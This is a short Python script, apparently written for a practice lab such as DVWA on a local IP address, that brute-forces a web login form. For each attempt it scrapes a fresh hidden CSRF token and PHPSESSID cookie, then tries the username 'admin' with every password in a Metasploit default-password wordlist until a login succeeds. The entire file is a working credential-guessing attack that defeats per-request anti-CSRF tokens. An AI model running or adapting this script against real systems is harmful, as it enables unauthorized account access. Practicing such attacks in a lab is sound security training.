import requests
from bs4 import BeautifulSoup

# attempt login
def try_creds(url, username, password, token, cookie):
	data = {'username' :username, 'password' : password, "Login": 'Login', "user_token": token}
	res = requests.post(url, data=data, cookies = cookie)
	return res.text

# extract session ID from cookies
def extract_session_id(response):
	cookies = response.cookies
	for c in cookies:
		if c.name == "PHPSESSID":
			return c.value

# clean token (remove characters)
def clean_token(token):
	str1 = token.replace("'", "")
	new_token = str1.replace("\\", "")
	return new_token 

# extract token from response HTML
def extract_csrf(res):
	html = BeautifulSoup(str(res.text), "html.parser")
	
	for inp in html.find_all("input"):
		if "hidden" in inp.get("type"):
			token = inp.get("value")
			return clean_token(token)

# main entry point
def main():
	
	url = "http://192.168.1.14/index/login.php"
	word_list = "/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt"

	# - loop through password file and attempt to login
	with open(word_list, "r") as file:
		for password in file:
			# for each password attempt we generate a new session / token
			webpage = requests.get(url)
			token = extract_csrf(webpage)
			session_id = extract_session_id(webpage)
			cookie = {"PHPSESSID": session_id}
			password = password.strip()
			res = try_creds(url, "admin", password, token, cookie)

			if "Login failed" in res:
				print(password + " : failed")
			else:
				print("___________________________________")
				print("Password Found: " + password)
				print("___________________________________")
				break
				
if __name__ == "__main__":
	main()
	

